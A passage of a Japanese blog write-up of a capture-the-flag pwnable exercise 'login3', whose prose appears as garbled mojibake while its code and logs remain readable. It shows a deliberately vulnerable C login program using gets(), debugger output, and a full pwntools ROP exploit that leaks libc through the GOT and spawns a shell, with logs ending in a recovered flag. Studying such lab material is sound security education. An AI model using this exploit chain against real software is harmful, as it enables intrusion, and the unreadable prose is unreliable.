#### 4.1�F���̊T�v

�\�[�X�R�[�h�ilogin3.c�j�ƁA�v���O�����o�C�i���ilogin3�j�Alibc�ilibc-2.31.so�j���񋟂���Ă��܂��B

[����](https://daisuke20240310.hatenablog.com/entry/kaidai_1) �ŏЉ���悤�ɁAdocker ���N�����Ă����A�u���E�U�ɃA�N�Z�X���܂��B���}�̂悤�ɁA���ꂼ��̃����N���N���b�N���邱�ƂŁA�_�E�����[�h���邱�Ƃ��o���܂��B

<figure class="figure-image figure-image-fotolife" title="login3">[f:id:daisuke20240310:20250518213656p:plain:alt=login3]<figcaption>login3</figcaption></figure>

#### ���H

�܂��́A���͂ł���Ă����܂��B

���s������t�^���Ă����܂��B�܂��A�ŏ�����Aglibc-2.31 �Ɉˑ����C�u������ύX���Ă����܂��i���@�A�o�܂Ȃǂ́A[�V�X�e���ɃC���X�g�[�����ꂽ���̂ƈقȂ�o�[�W������glibc���g�����@](https://daisuke20240310.hatenablog.com/entry/glibc) ���Q�l�ɂ��Ă��������j�B����́Alibc-2.31.so ���񋟂���Ă���̂ŕs�v��������܂��񂪁A�ꉞ�������Ă����܂��B

���ƁA�\�w��͂��܂��BNX disable �Ȃ̂ŁA��������̃R�[�h�����s�ł��܂��B

```sh
$ chmod +x login3

$ cp ./login3 ./login3_patch

$ patchelf --set-rpath /home/user/svn/oss/glibc231/lib/x86_64-linux-gnu --set-interpreter /home/user/svn/oss/glibc231/lib/x86_64-linux-gnu/ld-2.31.so ./login3_patch 

$ ldd login3
        linux-vdso.so.1 (0x00007ffd45f86000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3281929000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f3281b25000)

$ file login3_patch
login3_patch: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /home/user/svn/oss/glibc231/lib/x86_64-linux-gnu/ld-2.31.so, for GNU/Linux 3.2.0, BuildID[sha1]=b44231ea75df75583d86800fca2461911c7fb436, not stripped

$ ~/bin/checksec --file=login3_patch
RELRO          STACK CANARY     NX           PIE     RPATH     RUNPATH     Symbols     FORTIFY  Fortified  Fortifiable  FILE
Partial RELRO  No canary found  NX disabled  No PIE  No RPATH  RW-RUNPATH  70 Symbols  No       0          2            login3_patch

$ pwn checksec --file=login3_patch
[*] '/home/user/svn/experiment/kaidai_pwnable/chapter4/login3_patch'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3ff000)
    RUNPATH:    b'/home/user/svn/oss/glibc231/lib/x86_64-linux-gnu'
    Stripped:   No
```

���s���Ă݂܂��B

��蕶�́A�uYou can login. So what?�v�ł��B�\�[�X�R�[�h������ƁAID �� admin �̂悤�Ȃ̂ŁA������ł����s���Ă݂܂��B�������܂������A�t���O�͕\������܂���B�V�F�������K�v�����肻���ł��B

```sh
$ ./login3
ID: aaa
Invalid ID

$ ./login3
ID: admin
Login Succeeded
```

�\�[�X�R�[�h�ilogin3.c�j�����Ă����܂��B

setup�֐��́A�������ł��Bmain�֐�������ƁAID �� admin �ł��邱�Ƃ�������܂��B

���[�J���ϐ��� id �́A�X�^�b�N�o�b�t�@�I�[�o�[�t���[���N���������ł��B�Z�L�����e�B�@�\�Ƃ��ẮA�V�F���R�[�h�̎��s���\�ł����A�X�^�b�N�̃A�h���X���K�v�ɂȂ�܂��B�������́A���^�[���A�h���X�����������āAROP �����s���āAprintf�֐��ŁAGOT �̒l��ǂݏo���āAlibc �̃A�h���X���Z�o���Amain�֐��ɖ߂��āA���� ROP �ŁAsystem�֐������s����A�Ƃ������Ƃ��ł���\��������܂��B

```c
//  gcc login3.c -o login3 -fno-stack-protector -no-pie -fcf-protection=none
#include <stdio.h>
#include <string.h>
#include <unistd.h>

char *gets(char *s);

void setup()
{
    alarm(60);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

int main()
{
    char id[0x20] = "";

    setup();

    printf("ID: ");
    gets(id);

    if (strcmp(id, "admin") == 0)
        printf("Login Succeeded\n");
    else
        printf("Invalid ID\n");
}
```

GDB �ŋN�����āA�X�^�b�N�̏󋵂��m�F���܂��B

```sh
$ gdb -q login3_patch
Reading symbols from login3_patch...

pwndbg> start
Temporary breakpoint 1 at 0x4011e5

pwndbg> disassemble
Dump of assembler code for function main:
   0x00000000004011e1 <+0>:     push   rbp
   0x00000000004011e2 <+1>:     mov    rbp,rsp
=> 0x00000000004011e5 <+4>:     sub    rsp,0x20
   0x00000000004011e9 <+8>:     mov    QWORD PTR [rbp-0x20],0x0
   0x00000000004011f1 <+16>:    mov    QWORD PTR [rbp-0x18],0x0
   0x00000000004011f9 <+24>:    mov    QWORD PTR [rbp-0x10],0x0
   0x0000000000401201 <+32>:    mov    QWORD PTR [rbp-0x8],0x0
   0x0000000000401209 <+40>:    mov    eax,0x0
   0x000000000040120e <+45>:    call   0x401176 <setup>
   0x0000000000401213 <+50>:    lea    rdi,[rip+0xdea]        # 0x402004
   0x000000000040121a <+57>:    mov    eax,0x0
   0x000000000040121f <+62>:    call   0x401040 <printf@plt>
   0x0000000000401224 <+67>:    lea    rax,[rbp-0x20]
   0x0000000000401228 <+71>:    mov    rdi,rax
   0x000000000040122b <+74>:    call   0x401070 <gets@plt>
   0x0000000000401230 <+79>:    lea    rax,[rbp-0x20]
   0x0000000000401234 <+83>:    lea    rsi,[rip+0xdce]        # 0x402009
   0x000000000040123b <+90>:    mov    rdi,rax
   0x000000000040123e <+93>:    call   0x401060 <strcmp@plt>
   0x0000000000401243 <+98>:    test   eax,eax
   0x0000000000401245 <+100>:   jne    0x401255 <main+116>
   0x0000000000401247 <+102>:   lea    rdi,[rip+0xdc1]        # 0x40200f
   0x000000000040124e <+109>:   call   0x401030 <puts@plt>
   0x0000000000401253 <+114>:   jmp    0x401261 <main+128>
   0x0000000000401255 <+116>:   lea    rdi,[rip+0xdc3]        # 0x40201f
   0x000000000040125c <+123>:   call   0x401030 <puts@plt>
   0x0000000000401261 <+128>:   mov    eax,0x0
   0x0000000000401266 <+133>:   leave
   0x0000000000401267 <+134>:   ret
End of assembler dump.
```

�X�^�b�N���������܂��B

| �A�h���X | �T�C�Y | ���e |
| - | - | - |
| rbp - 0x20 | 32 | id[32]�irsp�j |
| rbp |

�V�F������邽�߂̃V�F���R�[�h�́A48byte �K�v�ł����Bid�z��ɒu���̂͌������̂ŁA���^�[���A�h���X�ȍ~�ɒu���K�v������܂����A�X�^�b�N�̗̈�𒴂��Ȃ����������S�z�ł��B

�m�F�����Ƃ���A���v�����ł��B

```sh
pwndbg> i r $rsp
rsp            0x7fffffffdd30      0x7fffffffdd30

pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
          0x3ff000           0x400000 rw-p     1000      0 /home/user/svn/experiment/kaidai_pwnable/chapter4/login3_patch
          0x400000           0x401000 r--p     1000   1000 /home/user/svn/experiment/kaidai_pwnable/chapter4/login3_patch
          0x401000           0x402000 r-xp     1000   2000 /home/user/svn/experiment/kaidai_pwnable/chapter4/login3_patch
          0x402000           0x403000 r--p     1000   3000 /home/user/svn/experiment/kaidai_pwnable/chapter4/login3_patch
          0x403000           0x404000 r--p     1000   3000 /home/user/svn/experiment/kaidai_pwnable/chapter4/login3_patch
          0x404000           0x405000 rw-p     1000   4000 /home/user/svn/experiment/kaidai_pwnable/chapter4/login3_patch
    0x7ffff7dd5000     0x7ffff7dfa000 r--p    25000      0 /home/user/svn/oss/glibc231/lib/x86_64-linux-gnu/libc-2.31.so
    0x7ffff7dfa000     0x7ffff7f72000 r-xp   178000  25000 /home/user/svn/oss/glibc231/lib/x86_64-linux-gnu/libc-2.31.so
    0x7ffff7f72000     0x7ffff7fbc000 r--p    4a000 19d000 /home/user/svn/oss/glibc231/lib/x86_64-linux-gnu/libc-2.31.so
    0x7ffff7fbc000     0x7ffff7fbd000 ---p     1000 1e7000 /home/user/svn/oss/glibc231/lib/x86_64-linux-gnu/libc-2.31.so
    0x7ffff7fbd000     0x7ffff7fc0000 r--p     3000 1e7000 /home/user/svn/oss/glibc231/lib/x86_64-linux-gnu/libc-2.31.so
    0x7ffff7fc0000     0x7ffff7fc3000 rw-p     3000 1ea000 /home/user/svn/oss/glibc231/lib/x86_64-linux-gnu/libc-2.31.so
    0x7ffff7fc3000     0x7ffff7fc9000 rw-p     6000      0 [anon_7ffff7fc3]
    0x7ffff7fc9000     0x7ffff7fcd000 r--p     4000      0 [vvar]
    0x7ffff7fcd000     0x7ffff7fcf000 r-xp     2000      0 [vdso]
    0x7ffff7fcf000     0x7ffff7fd0000 r--p     1000      0 /home/user/svn/oss/glibc231/lib/x86_64-linux-gnu/ld-2.31.so
    0x7ffff7fd0000     0x7ffff7ff3000 r-xp    23000   1000 /home/user/svn/oss/glibc231/lib/x86_64-linux-gnu/ld-2.31.so
    0x7ffff7ff3000     0x7ffff7ffb000 r--p     8000  24000 /home/user/svn/oss/glibc231/lib/x86_64-linux-gnu/ld-2.31.so
    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000  2c000 /home/user/svn/oss/glibc231/lib/x86_64-linux-gnu/ld-2.31.so
    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000  2d000 /home/user/svn/oss/glibc231/lib/x86_64-linux-gnu/ld-2.31.so
    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000      0 [anon_7ffff7ffe]
    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]
```

�������Aid�z��̃A�h���X���擾����̂�������ł��B

���ɁAROP ���l���Ă݂܂��B���ɖ��͖��������ł��B���e�́A��Ō������ʂ�ł��B�X�^�b�N�o�b�t�@�I�[�o�[�t���[�𔭐������āA���^�[���A�h���X�� ROP�K�W�F�b�g��z�u���܂��BROP�K�W�F�b�g�̓��e�́Aprintf�֐��ŁAGOT �̒l��ǂݏo���āAlibc �̃A�h���X���Z�o���Amain�֐��ɖ߂��āA���� ROP �ŁAsystem�֐������s���܂��B

�G�N�X�v���C�g�R�[�h���������܂����B

```python
#!/usr/bin/env python3
from pwn import *

bin_file = './login3_patch'
context(os = 'linux', arch = 'amd64')
context(terminal = ['tmux', 'splitw', '-h'])
context.log_level = 'debug'

binf = ELF( bin_file )

libc = binf.libc
offset_libc_setvbuf = libc.functions['setvbuf'].address
addr_got_setvbuf = binf.got['setvbuf']

def attack( proc, **kwargs ):
    
    rop = ROP( binf )
    rop.raw( rop.ret ) # 16byte�A���C�����g�̂���
    rop.printf( addr_got_setvbuf )
    rop.raw( rop.ret ) # 16byte�A���C�����g�̂���
    rop.main()
    
    proc.sendlineafter( 'ID: ', b'a' * 32 + p64(0xdeadbeaf) + bytes(rop) )
    proc.recvuntil( "Invalid ID" )
    proc.recv(1)
    addr_libc_setvbuf = unpack( proc.recv(6), 'all' )
    libc.address = addr_libc_setvbuf - offset_libc_setvbuf
    info( f"addr_libc_base = {libc.address:#x}, addr_libc_setvbuf={addr_libc_setvbuf:#x}" )
    addr_libc_str_sh = next( libc.search(b'/bin/sh') )
    
    rop = ROP( libc )
    rop.raw( rop.ret )
    rop.system( addr_libc_str_sh )
    
    proc.sendlineafter('ID: ', b'a' * 32 + p64(0xdeadbeaf) + bytes(rop) )
    
    #info( proc.recvall() )

def main():
    
    adrs = "localhost"
    port = 10003
    
    #proc = gdb.debug( bin_file )
    #proc = process( bin_file )
    proc = remote( adrs, port )
    
    attack( proc )
    proc.interactive()

if __name__ == '__main__':
    main()
```

���s���Ă݂܂��B

�����ɁA�V�F�������܂����B

```sh
$ python exploit_login3.py
[*] '/home/user/svn/experiment/kaidai_pwnable/chapter4/login3_patch'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3ff000)
    RUNPATH:    b'/home/user/svn/oss/glibc231/lib/x86_64-linux-gnu'
    Stripped:   No
[*] '/home/user/svn/oss/glibc231/lib/x86_64-linux-gnu/libc-2.31.so'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
[+] Starting local process './login3_patch' argv=[b'./login3_patch'] : pid 1477731
[*] Loaded 14 cached gadgets for './login3_patch'
/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py:841: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[DEBUG] Received 0x4 bytes:
    b'ID: '
[DEBUG] Sent 0x59 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  xaaaaxaaaaxaaaaxaaaax
    *
    00000020  af be ad de  00 00 00 00  1a 10 40 00  00 00 00 00  x????x????x??@?x????x
    00000030  d3 12 40 00  00 00 00 00  40 40 40 00  00 00 00 00  x??@?x????x@@@?x????x
    00000040  40 10 40 00  00 00 00 00  1a 10 40 00  00 00 00 00  x@?@?x????x??@?x????x
    00000050  e1 11 40 00  00 00 00 00  0a                        x??@?x????x?x
    00000059
/home/user/svn/experiment/kaidai_pwnable/chapter4/exploit_login3.py:24: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  proc.recvuntil( "Invalid ID" )
[DEBUG] Received 0x15 bytes:
    00000000  49 6e 76 61  6c 69 64 20  49 44 0a 60  3e fe 66 d6  xInvaxlid xID?`x>?f?x
    00000010  7f 49 44 3a  20                                     x?ID:x x
    00000015
[*] addr_libc_base = 0x7fd666f5c000, addr_libc_setvbuf=0x7fd666fe3e60
[*] Loaded 200 cached gadgets for '/home/user/svn/oss/glibc231/lib/x86_64-linux-gnu/libc-2.31.so'
[DEBUG] Sent 0x49 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  xaaaaxaaaaxaaaaxaaaax
    *
    00000020  af be ad de  00 00 00 00  79 16 f8 66  d6 7f 00 00  x????x????xy??fx????x
    00000030  72 2b f8 66  d6 7f 00 00  aa 35 11 67  d6 7f 00 00  xr+?fx????x?5?gx????x
    00000040  10 14 fb 66  d6 7f 00 00  0a                        x???fx????x?x
    00000049
[*] Switching to interactive mode
[DEBUG] Received 0xb bytes:
    b'Invalid ID\n'
Invalid ID
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x46 bytes:
    b'core  exploit_login3.py  libc-2.31.so  login3  login3.c  login3_patch\n'
core  exploit_login3.py  libc-2.31.so  login3  login3.c  login3_patch
$
[*] Stopped process './login3_patch' (pid 1477731)
```

�T�[�o�̕�������Ă݂܂��B��������������܂����B

```sh
$ python exploit_login3.py
[*] '/home/user/svn/experiment/kaidai_pwnable/chapter4/login3_patch'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3ff000)
    RUNPATH:    b'/home/user/svn/oss/glibc231/lib/x86_64-linux-gnu'
    Stripped:   No
[*] '/home/user/svn/oss/glibc231/lib/x86_64-linux-gnu/libc-2.31.so'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
[+] Opening connection to localhost on port 10003: Done
[*] Loaded 14 cached gadgets for './login3_patch'
/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py:841: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[DEBUG] Received 0x4 bytes:
    b'ID: '
[DEBUG] Sent 0x59 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  xaaaaxaaaaxaaaaxaaaax
    *
    00000020  af be ad de  00 00 00 00  1a 10 40 00  00 00 00 00  x????x????x??@?x????x
    00000030  d3 12 40 00  00 00 00 00  40 40 40 00  00 00 00 00  x??@?x????x@@@?x????x
    00000040  40 10 40 00  00 00 00 00  1a 10 40 00  00 00 00 00  x@?@?x????x??@?x????x
    00000050  e1 11 40 00  00 00 00 00  0a                        x??@?x????x?x
    00000059
/home/user/svn/experiment/kaidai_pwnable/chapter4/exploit_login3.py:24: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  proc.recvuntil( "Invalid ID" )
[DEBUG] Received 0x15 bytes:
    00000000  49 6e 76 61  6c 69 64 20  49 44 0a 60  de f6 e6 3b  xInvaxlid xID?`x???;x
    00000010  7f 49 44 3a  20                                     x?ID:x x
    00000015
[*] addr_libc_base = 0x7f3be6ee6000, addr_libc_setvbuf=0x7f3be6f6de60
[*] Loaded 200 cached gadgets for '/home/user/svn/oss/glibc231/lib/x86_64-linux-gnu/libc-2.31.so'
[DEBUG] Sent 0x49 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  xaaaaxaaaaxaaaaxaaaax
    *
    00000020  af be ad de  00 00 00 00  79 b6 f0 e6  3b 7f 00 00  x????x????xy???x;???x
    00000030  72 cb f0 e6  3b 7f 00 00  aa d5 09 e7  3b 7f 00 00  xr???x;???x????x;???x
    00000040  10 b4 f3 e6  3b 7f 00 00  0a                        x????x;???x?x
    00000049
[*] Switching to interactive mode
[DEBUG] Received 0xb bytes:
    b'Invalid ID\n'
Invalid ID
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x1a bytes:
    b'flag.txt\n'
    b'login3\n'
    b'login3.sh\n'
flag.txt
login3
login3.sh
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x17 bytes:
    b'FLAG{vOvF4gQyzrRq50eH}\n'
FLAG{vOvF4gQyzrRq50eH}
$
[*] Closed connection to localhost port 10003
```

<figure class="figure-image figure-image-fotolife" title="login3 Submit">[f:id:daisuke20240310:20250518171054p:plain:alt=login3 Submit]<figcaption>login3 Submit</figcaption></figure>